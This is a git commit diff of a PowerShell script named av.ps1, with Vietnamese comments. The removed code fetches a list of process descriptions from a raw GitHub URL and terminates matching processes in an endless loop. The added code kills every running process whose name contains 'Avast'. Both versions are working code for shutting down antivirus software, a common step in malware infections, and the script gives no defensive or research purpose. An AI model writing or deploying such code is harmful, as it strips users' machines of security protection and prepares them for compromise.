3f736c209d716f9dd110629a7486622a3247daf6
43a1723 <hai1723notgay@gmail.com>
2024-07-28 18:11:53 +0700

    Update av.ps1

--- output/av.ps1
+++ output/av.ps1
@@ -1,22 +1,12 @@
-# Đọc nội dung từ URL và lưu vào biến
-$url = "https://raw.githubusercontent.com/43a1723/test/main/output/av.txt"
-$processDescriptions = Invoke-RestMethod -Uri $url
+# Lấy danh sách các tiến trình có tên chứa "Avast"
+$processes = Get-Process | Where-Object { $_.Name -like "*Avast*" }
 
-# Tạo vòng lặp vô tận
-while ($true) {
-    foreach ($description in $processDescriptions) {
-        # Lấy danh sách các tiến trình và mô tả của chúng
-        Get-WmiObject Win32_Process | Where-Object { $_.Description -like "*$description*" } | ForEach-Object {
-            try {
-                # Dừng tiến trình
-                $_.Terminate()
-                Write-Output "Terminated process: $($_.Name) with description containing '$description'"
-            } catch {
-                Write-Output "Failed to terminate process: $($_.Name) with description containing '$description'"
-            }
-        }
+# Tắt các tiến trình đó
+$processes | ForEach-Object {
+    try {
+        $_.Kill()
+        Write-Output "Terminated process: $($_.Name)"
+    } catch {
+        Write-Output "Failed to terminate process: $($_.Name)"
     }
-    
-    # Chờ 1 giây trước khi lặp lại
-    Start-Sleep -Seconds 1
 }
